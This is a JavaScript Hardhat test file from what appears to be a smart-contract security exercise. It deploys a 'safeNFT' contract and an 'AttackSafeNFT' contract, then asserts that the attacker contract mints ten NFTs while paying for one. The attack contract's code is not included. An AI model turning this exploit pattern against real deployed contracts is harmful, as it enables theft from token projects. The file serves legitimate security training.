const {time, loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("safeNFT", function () {

  let deployer, attacker;
  const price = ethers.utils.parseEther('0.01')

  before(async function (){
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const safeNFTFactory = await ethers.getContractFactory("safeNFT");
    this.safeNFT = await safeNFTFactory.deploy("TestNFT", "TTN", price);
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Lets try minting 10 NFTs 
    numOfNfts = 10;
    const AttackSafeNFTFactory = await ethers.getContractFactory("AttackSafeNFT");
    this.AttackSafeNFT = await AttackSafeNFTFactory.deploy(this.safeNFT.address);
    let tx = await this.AttackSafeNFT.connect(attacker).mintAttack(numOfNfts, {value:price})
    tx.wait()
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker mints multiple NFTs as exploited above 
    expect(await this.safeNFT.balanceOf(this.AttackSafeNFT.address)).to.be.gt(1);        
    expect(await this.safeNFT.balanceOf(this.AttackSafeNFT.address)).to.be.eq(numOfNfts);        
  });

});
